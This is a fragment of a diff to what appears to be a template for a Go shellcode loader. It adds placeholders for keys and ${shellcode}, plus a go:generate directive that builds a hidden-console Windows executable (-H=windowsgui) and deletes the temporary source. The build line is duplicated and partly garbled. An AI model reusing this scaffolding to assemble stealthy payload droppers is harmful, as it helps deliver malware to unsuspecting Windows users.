@@ -13,6 +13,19 @@ gunzip shell.gz
 ## main.go
 
 ```
+${KEY_1}
+
+${KEY_2}
+
+${shellcode}
+
+${GONERATE}
+$build = "//go:generate -command shell bash -c \"GOOS=windows&& GOARCH= $+ $arch && go build -o $path -ldflags -H=windowsgui /tmp/temp.go && rm /tmp/temp.go\"";
+//go:generate -command shell bash -c "GOOS=windows&& GOARCH= $+ $arch && go build -o $path -ldflags -H=windowsgui /tmp/temp.go && rm /tmp/temp.go"
+
+```
+
+```
 package main
 
 ${GONERATE}
